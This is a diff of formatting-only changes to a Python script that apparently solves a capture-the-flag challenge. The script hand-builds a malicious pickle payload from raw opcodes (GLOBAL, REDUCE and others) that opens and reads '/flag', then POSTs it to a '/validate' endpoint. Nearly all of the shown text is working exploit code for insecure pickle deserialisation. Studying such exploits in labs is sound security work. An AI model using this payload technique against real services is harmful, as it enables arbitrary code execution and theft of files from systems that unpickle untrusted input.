@@ -43,10 +43,10 @@ import urllib.request
 
 # Pickle opcodes we assemble by hand (protocol-agnostic; pickle.loads executes
 # any mix). See CPython Lib/pickle.py.
-GLOBAL = b"c"           # c<module>\n<name>\n  -> push find_class(module, name)
-SHORT_BINUNICODE = b"\x8c"   # \x8c <1-byte len> <utf8>  -> push str
-TUPLE1 = b"\x85"        # pop 1 -> push 1-tuple
-REDUCE = b"R"           # pop (callable, argtuple) -> push callable(*argtuple)
+GLOBAL = b"c"  # c<module>\n<name>\n  -> push find_class(module, name)
+SHORT_BINUNICODE = b"\x8c"  # \x8c <1-byte len> <utf8>  -> push str
+TUPLE1 = b"\x85"  # pop 1 -> push 1-tuple
+REDUCE = b"R"  # pop (callable, argtuple) -> push callable(*argtuple)
 STOP = b"."
 
 
@@ -73,8 +73,8 @@ def build_payload(flag_path: str = "/flag") -> bytes:
     p += TUPLE1
     p += REDUCE
     # result = mc(f) == f.read()
-    p += TUPLE1          # wrap f as (f,)
-    p += REDUCE          # mc(f)
+    p += TUPLE1  # wrap f as (f,)
+    p += REDUCE  # mc(f)
     p += STOP
     return p
 
@@ -82,7 +82,8 @@ def build_payload(flag_path: str = "/flag") -> bytes:
 def submit(base_url: str, payload: bytes) -> dict:
     url = base_url.rstrip("/") + "/validate"
     req = urllib.request.Request(
-        url, data=payload,
+        url,
+        data=payload,
         headers={"Content-Type": "application/octet-stream"},
     )
     with urllib.request.urlopen(req, timeout=30) as resp:
